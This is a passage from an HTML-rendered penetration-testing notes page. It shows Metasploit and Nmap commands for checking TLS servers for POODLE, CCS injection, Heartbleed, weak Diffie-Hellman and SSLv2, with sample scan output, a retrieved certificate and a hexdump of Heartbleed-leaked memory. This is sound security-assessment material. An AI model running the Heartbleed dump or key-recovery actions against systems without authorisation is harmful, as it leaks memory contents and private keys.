<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="n">has</span> <span class="n">common</span> <span class="n">name</span> <span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">1</span> <span class="n">of</span> <span class="mi">1</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
<p>and</p>
</div>
<div class="section" id="http-ssl-tls-version-detection-poodle-scanner">
<h4>HTTP SSL/TLS Version Detection (POODLE scanner)<a class="headerlink" href="#http-ssl-tls-version-detection-poodle-scanner" title="Permalink to this headline">¶</a></h4>
<p>If a web server can successfully establish an SSLv3 session, it is likely to be vulnerable to the POODLE attack.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">ssl_version</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="n">accepts</span> <span class="n">SSLv3</span>
</pre></div>
</div>
</div>
<div class="section" id="openssl-server-side-changecipherspec-injection-scanner">
<h4>OpenSSL Server-Side ChangeCipherSpec Injection Scanner<a class="headerlink" href="#openssl-server-side-changecipherspec-injection-scanner" title="Permalink to this headline">¶</a></h4>
<p>Checks for the OpenSSL ChangeCipherSpec (CCS) Injection vulnerability. The problem exists in the handling of early CCS messages during session negotiation. There&#8217;s a NSE for the same ssl-ccs-injection.nse.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">ssl</span><span class="o">/</span><span class="n">openssl_ccs</span>
</pre></div>
</div>
</div>
<div class="section" id="openssl-heartbeat-heartbleed-information-leak">
<h4>OpenSSL Heartbeat (Heartbleed) Information Leak<a class="headerlink" href="#openssl-heartbeat-heartbleed-information-leak" title="Permalink to this headline">¶</a></h4>
<p>Module checks for the OpenSSL Heartbleed attack. The module supports several actions, allowing for scanning, dumping of memory contents, and private key recovery. It has three Actions: SCAN, KEYS, DUMP which scans the host for the vulnerablity, scan for the private keys and dump the memory of the host.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">ssl</span><span class="o">/</span><span class="n">openssl_heartbleed</span>
</pre></div>
</div>
<p>SCAN Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="o">-</span> <span class="n">Heartbeat</span> <span class="n">response</span> <span class="k">with</span> <span class="n">leak</span>
</pre></div>
</div>
<p>DUMP Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>[+] 10.10.xx.xx:443 - Heartbeat response with leak
[*] 10.10.xx.xx:443 - Heartbeat data stored in /root/.msf5/loot/20160403185025_default_10.10.235.69_openssl.heartble_299937.bin

hexdump -C /root/.msf5/loot/20160403185025_default_10.10.xx.xx_openssl.heartble_299937.bin | more
00000000  02 ff ff 94 03 01 57 00  0f a8 cf 31 3f 02 84 0b  |......W....1?...|
00000010  59 9a d1 6b 3b 20 7b 7b  75 6b 17 2c 03 8d 8d 6a  |Y..k; \{\{uk.,...j|
00000020  77 de b2 3a e3 28 00 00  66 c0 14 c0 0a c0 22 c0  |w..:.(..f.....&quot;.|
00000030  21 00 39 00 38 00 88 00  87 00 87 c0 0f 00 35 00  |!.9.8.........5.|
00000040  84 c0 12 c0 08 c0 1c c0  1b 00 16 00 13 c0 0d c0  |................|
00000050  03 00 0a c0 13 c0 09 c0  1f c0 1e 00 33 00 32 00  |............3.2.|
00000060  9a 00 99 00 45 00 44 c0  0e c0 04 00 2f 00 96 00  |....E.D...../...|
00000070  41 c0 11 c0 07 c0 0c c0  02 00 05 00 04 00 15 00  |A...............|
00000080  12 00 09 00 14 00 11 00  08 00 06 00 03 00 ff 01  |................|
00000090  00 00 05 00 0f 00 01 01  06 03 02 03 04 02 02 02  |................|
000000a0  07 c0 0c c0 02 00 05 00  04 00 15 00 12 00 09 00  |................|
000000b0  ff 02 01 00 00 85 00 00  00 12 00 10 00 00 0d 32  |...............1|
000000c0  32 33 2e 33 30 2e 32 33  35 2e 36 36 00 0b 00 04  |10.10.xx.xx....|
000000d0  03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19  |.......4.2......|
000000e0  00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08  |................|
000000f0  00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13  |................|
00000100  00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00  |.............#..|
00000110  00 0d 00 22 00 20 06 01  06 02 06 03 05 01 05 02  |...&quot;. ..........|
00000120  05 03 04 01 04 02 04 03  03 01 03 02 03 03 02 01  |................|
00000130  02 02 02 03 01 01 00 0f  00 01 01 00 00 00 00 00  |................|
00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</pre></div>
</div>
</div>
</div>
<div class="section" id="id37">
<h3>Nmap<a class="headerlink" href="#id37" title="Permalink to this headline">¶</a></h3>
<p>Nmap has around</p>
<div class="section" id="ssl-cert">
<h4>ssl-cert<a class="headerlink" href="#ssl-cert" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-cert.html">ssl-cert.nse</a> : Retrieves a server&#8217;s SSL certificate. The amount of information printed about the certificate depends on the verbosity level. With no extra verbosity, the script prints the validity period and the commonName, organizationName, stateOrProvinceName, and countryName of the subject.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="n">p</span> <span class="mi">443</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">vv</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">reset</span> <span class="n">ttl</span> <span class="mi">60</span> <span class="p">(</span><span class="mf">0.011</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Scanned</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span> <span class="mi">18</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">50</span> <span class="n">IST</span> <span class="k">for</span> <span class="mi">57</span><span class="n">s</span>
<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>  <span class="n">REASON</span>         <span class="n">VERSION</span>
<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">http</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">53</span> <span class="n">Apache</span> <span class="n">httpd</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">astarouflex</span><span class="o">.</span><span class="n">flexfilm</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">Uflex</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="ow">in</span><span class="o">/</span><span class="n">localityName</span><span class="o">=</span><span class="n">Noida</span>
<span class="o">|</span> <span class="n">Issuer</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">virstech</span> <span class="n">WebAdmin</span> <span class="n">CA</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">virstech</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="ow">in</span><span class="o">/</span><span class="n">emailAddress</span><span class="o">=</span><span class="n">g</span><span class="nd">@gmail</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">localityName</span><span class="o">=</span><span class="n">dehli</span>
<span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="nb">type</span><span class="p">:</span> <span class="n">rsa</span>
<span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="n">bits</span><span class="p">:</span> <span class="mi">1024</span>
<span class="o">|</span> <span class="n">Signature</span> <span class="n">Algorithm</span><span class="p">:</span> <span class="n">sha1WithRSAEncryption</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2013</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">01</span><span class="n">T13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">36</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2038</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">01</span><span class="n">T00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">01</span>
<span class="o">|</span> <span class="n">MD5</span><span class="p">:</span>   <span class="n">c213</span> <span class="mi">2536</span> <span class="mi">95</span><span class="n">b4</span> <span class="mi">0</span><span class="n">fbd</span> <span class="mi">0784</span> <span class="mi">5</span><span class="n">a68</span> <span class="n">f2c0</span> <span class="mi">3979</span>
<span class="o">|</span> <span class="n">SHA</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="mi">5</span><span class="n">f8d</span> <span class="mi">5</span><span class="n">cf5</span> <span class="mi">6</span><span class="n">f5c</span> <span class="mi">8</span><span class="n">b23</span> <span class="n">dc49</span> <span class="mi">83</span><span class="n">ec</span> <span class="mi">6251</span> <span class="n">b050</span> <span class="mi">3</span><span class="n">fda</span> <span class="mi">997</span><span class="n">e</span>
<span class="o">|</span> <span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="o">|</span> <span class="n">MIIDOTCCAqKgAwIBAgIJANqxAruC7sYGMA0GCSqGSIb3DQEBBQUAMGsxCzAJBgNV</span>
<span class="o">|</span> <span class="n">BAYTAmluMQ4wDAYDVQQHEwVkZWhsaTERMA8GA1UEChMIdmlyc3RlY2gxHTAbBgNV</span>
<span class="o">|</span> <span class="n">BAMTFHZpcnN0ZWNoIFdlYkFkbWluIENBMRowGAYJKoZIhvcNAQkBFgtnQGdtYWls</span>
<span class="o">|</span> <span class="n">LmNvbTAeFw0xMzAyMDExMzI3MzZaFw0zODAxMDEwMDAwMDFaMFAxCzAJBgNVBAYT</span>
<span class="o">|</span> <span class="n">AmluMQ4wDAYDVQQHEwVOb2lkYTEOMAwGA1UEChMFVWZsZXgxITAfBgNVBAMTGGFz</span>
<span class="o">|</span> <span class="n">dGFyb3VmbGV4LmZsZXhmaWxtLmNvbTCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkC</span>
<span class="o">|</span> <span class="n">gYEAl09PwQfNKGMaqzD7CYLMQOskqMcP6MXJcPuHBl8wFte4M4yDzRTGJwEjmv9u</span>
<span class="o">|</span> <span class="n">mcvv2HShww0nMXS2XEosjy65I2NqRBBFQ</span><span class="o">/+</span><span class="n">DmXtdiuoiWBeMk0OhV94fgSwDnhB</span><span class="o">/</span>
<span class="o">|</span> <span class="mi">83</span><span class="n">RYyzKGMfKwOb63ovp8D78ufysPxqL8O49o</span><span class="o">+</span><span class="mi">1</span><span class="n">bFMQYCoW0CAwEAAaOB</span><span class="o">/</span><span class="n">zCB</span><span class="o">/</span><span class="n">DAd</span>
<span class="o">|</span> <span class="n">BgNVHQ4EFgQUvgIR5fXbkeXtnlT4jjKuhnUHacgwgZ0GA1UdIwSBlTCBkoAUGIfJ</span>
<span class="o">|</span> <span class="n">GJvPoIGIJDyq9tgpKxU3gJihb6RtMGsxCzAJBgNVBAYTAmluMQ4wDAYDVQQHEwVk</span>
<span class="o">|</span> <span class="n">ZWhsaTERMA8GA1UEChMIdmlyc3RlY2gxHTAbBgNVBAMTFHZpcnN0ZWNoIFdlYkFk</span>
<span class="o">|</span> <span class="n">bWluIENBMRowGAYJKoZIhvcNAQkBFgtnQGdtYWlsLmNvbYIJANqxAruC7sYCMCMG</span>
<span class="o">|</span> <span class="n">A1UdEQQcMBqCGGFzdGFyb3VmbGV4LmZsZXhmaWxtLmNvbTAJBgNVHRMEAjAAMAsG</span>
<span class="o">|</span> <span class="n">A1UdDwQEAwIF4DANBgkqhkiG9w0BAQUFAAOBgQAentiShYI</span><span class="o">/</span><span class="n">t</span><span class="o">/</span><span class="n">XkWZrMe2E98RMs</span>
<span class="o">|</span> <span class="n">yoD</span><span class="o">+</span><span class="n">BgYGxe6Gwn</span><span class="o">+</span><span class="n">L3pbb8oM5bxxmkydwVENNVrOG</span><span class="o">+</span><span class="n">kp1imU75HYge4QtHldjFf0y</span>
<span class="o">|</span> <span class="n">i0myyr1jZ2IcnidcaYm</span><span class="o">/</span><span class="n">LhOFIUUmuP5YwDRK6jpIuJvzjDRcDxL63E9r950</span><span class="o">/</span><span class="n">f4jn</span>
<span class="o">|</span> <span class="n">DrGIgqEJr7O9HKO7Tw</span><span class="o">==</span>
<span class="o">|</span><span class="n">_</span><span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
</pre></div>
</div>
</div>
<div class="section" id="ssl-dh-params">
<h4>ssl-dh-params<a class="headerlink" href="#ssl-dh-params" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-dh-params.html">ssl-dh-params</a> : Weak ephemeral Diffie-Hellman parameter detection for SSL/TLS services. This script simulates SSL/TLS handshakes using ciphersuites that have ephemeral Diffie-Hellman as the key exchange algorithm.</p>
<p>Diffie-Hellman MODP group parameters are extracted and analyzed for vulnerability to Logjam (CVE 2015-4000) and other weaknesses.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">ssl</span><span class="o">-</span><span class="n">dh</span><span class="o">-</span><span class="n">params</span> <span class="o">-</span><span class="n">p</span> <span class="mi">443</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">n</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span> <span class="mi">19</span><span class="p">:</span><span class="mi">08</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.013</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">https</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">dh</span><span class="o">-</span><span class="n">params</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">VULNERABLE</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">Diffie</span><span class="o">-</span><span class="n">Hellman</span> <span class="n">Key</span> <span class="n">Exchange</span> <span class="n">Insufficient</span> <span class="n">Group</span> <span class="n">Strength</span>
<span class="o">|</span>     <span class="n">State</span><span class="p">:</span> <span class="n">VULNERABLE</span>
<span class="o">|</span>       <span class="n">Transport</span> <span class="n">Layer</span> <span class="n">Security</span> <span class="p">(</span><span class="n">TLS</span><span class="p">)</span> <span class="n">services</span> <span class="n">that</span> <span class="n">use</span> <span class="n">Diffie</span><span class="o">-</span><span class="n">Hellman</span> <span class="n">groups</span> <span class="n">of</span>
<span class="o">|</span>       <span class="n">insufficient</span> <span class="n">strength</span><span class="p">,</span> <span class="n">especially</span> <span class="n">those</span> <span class="n">using</span> <span class="n">one</span> <span class="n">of</span> <span class="n">a</span> <span class="n">few</span> <span class="n">commonly</span> <span class="n">shared</span>
<span class="o">|</span>       <span class="n">groups</span><span class="p">,</span> <span class="n">may</span> <span class="n">be</span> <span class="n">susceptible</span> <span class="n">to</span> <span class="n">passive</span> <span class="n">eavesdropping</span> <span class="n">attacks</span><span class="o">.</span>
<span class="o">|</span>     <span class="n">Check</span> <span class="n">results</span><span class="p">:</span>
<span class="o">|</span>       <span class="n">WEAK</span> <span class="n">DH</span> <span class="n">GROUP</span> <span class="mi">1</span>
<span class="o">|</span>             <span class="n">Cipher</span> <span class="n">Suite</span><span class="p">:</span> <span class="n">TLS_DHE_RSA_WITH_AES_256_GCM_SHA384</span>
<span class="o">|</span>             <span class="n">Modulus</span> <span class="n">Type</span><span class="p">:</span> <span class="n">Safe</span> <span class="n">prime</span>
<span class="o">|</span>             <span class="n">Modulus</span> <span class="n">Source</span><span class="p">:</span> <span class="n">mod_ssl</span> <span class="mf">2.2</span><span class="o">.</span><span class="n">x</span><span class="o">/</span><span class="mi">1024</span><span class="o">-</span><span class="n">bit</span> <span class="n">MODP</span> <span class="n">group</span> <span class="k">with</span> <span class="n">safe</span> <span class="n">prime</span> <span class="n">modulus</span>
<span class="o">|</span>             <span class="n">Modulus</span> <span class="n">Length</span><span class="p">:</span> <span class="mi">1024</span>
<span class="o">|</span>             <span class="n">Generator</span> <span class="n">Length</span><span class="p">:</span> <span class="mi">8</span>
<span class="o">|</span>             <span class="n">Public</span> <span class="n">Key</span> <span class="n">Length</span><span class="p">:</span> <span class="mi">1024</span>
<span class="o">|</span>     <span class="n">References</span><span class="p">:</span>
<span class="o">|</span><span class="n">_</span>      <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">weakdh</span><span class="o">.</span><span class="n">org</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">6.52</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="ssl-google-cert-catalog">
<h4>ssl-google-cert-catalog<a class="headerlink" href="#ssl-google-cert-catalog" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-google-cert-catalog.html">ssl-google-cert-catalog.nse</a> : Queries Google&#8217;s Certificate Catalog for the SSL certificates retrieved from target hosts.</p>
<p>The Certificate Catalog provides information about how recently and for how long Google has seen the given certificate. If a certificate doesn&#8217;t appear in the database, despite being correctly signed by a well-known CA and having a matching domain name, it may be suspicious.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">443</span> <span class="o">--</span><span class="n">script</span> <span class="n">ssl</span><span class="o">-</span><span class="n">google</span><span class="o">-</span><span class="n">cert</span><span class="o">-</span><span class="n">catalog</span> <span class="mf">223.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">n</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span> <span class="mi">19</span><span class="p">:</span><span class="mi">14</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">223.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.028</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">https</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">google</span><span class="o">-</span><span class="n">cert</span><span class="o">-</span><span class="n">catalog</span><span class="p">:</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">No</span> <span class="n">DB</span> <span class="n">entry</span>
</pre></div>
</div>
</div>
<div class="section" id="sslv2">
<h4>sslv2<a class="headerlink" href="#sslv2" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/sslv2.html">sslv2.nse</a> : Determines whether the server supports obsolete and less secure SSLv2, and discovers which ciphers it supports.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">443</span> <span class="o">--</span><span class="n">script</span> <span class="n">sslv2</span> <span class="mf">115.124</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">n</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span> <span class="mi">19</span><span class="p">:</span><span class="mi">24</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">115.124</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.0088</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">https</span>
<span class="o">|</span> <span class="n">sslv2</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">SSLv2</span> <span class="n">supported</span>
<span class="o">|</span>   <span class="n">ciphers</span><span class="p">:</span>
<span class="o">|</span>     <span class="n">SSL2_DES_192_EDE3_CBC_WITH_MD5</span>
<span class="o">|</span>     <span class="n">SSL2_RC2_CBC_128_CBC_WITH_MD5</span>
<span class="o">|</span>     <span class="n">SSL2_RC4_128_WITH_MD5</span>
<span class="o">|</span>     <span class="n">SSL2_RC4_64_WITH_MD5</span>
<span class="o">|</span>     <span class="n">SSL2_DES_64_CBC_WITH_MD5</span>
<span class="o">|</span>     <span class="n">SSL2_RC2_CBC_128_CBC_WITH_MD5</span>
<span class="o">|</span><span class="n">_</span>    <span class="n">SSL2_RC4_128_EXPORT40_WITH_MD5</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">0.37</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="ssl-ccs-injection">
<h4>ssl-ccs-injection<a class="headerlink" href="#ssl-ccs-injection" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html">ssl-ccs-injection.nse</a> : Detects whether a server is vulnerable to the SSL/TLS &#8220;CCS Injection&#8221; vulnerability (CVE-2014-0224). There&#8217;s a metasploit module for the same: openssl_ccs</p>
</div>
<div class="section" id="ssl-date">
<h4>ssl-date<a class="headerlink" href="#ssl-date" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-date.html">ssl-date.nse</a> : Retrieves a target host&#8217;s time and date from its TLS ServerHello response.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">443</span> <span class="o">--</span><span class="n">script</span> <span class="n">ssl</span><span class="o">-</span><span class="n">date</span> <span class="mf">115.124</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">n</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span> <span class="mi">19</span><span class="p">:</span><span class="mi">29</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">115.124</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.017</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">https</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span><span class="n">T18</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">19</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">4</span><span class="n">h49m42s</span> <span class="kn">from</span> <span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
</pre></div>
</div>
</div>
<div class="section" id="ssl-enum-ciphers">
<h4>ssl-enum-ciphers<a class="headerlink" href="#ssl-enum-ciphers" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssl-enum-ciphers.html">ssl-enum-ciphers.nse</a> : Script repeatedly initiates SSLv3/TLS connections, each time trying a new cipher or compressor while recording whether a host accepts or rejects it. The end result is a list of all the ciphersuites and compressors that a server accepts.</p>
<p>Each ciphersuite is shown with a letter grade (A through F) indicating the strength of the connection. The grade is based on the cryptographic strength of the key exchange and of the stream cipher.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">443</span> <span class="o">--</span><span class="n">script</span> <span class="n">ssl</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">ciphers</span> <span class="mf">115.124</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">n</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">03</span> <span class="mi">19</span><span class="p">:</span><span class="mi">33</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">115.124</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.0085</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">https</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">ciphers</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">SSLv3</span><span class="p">:</span>
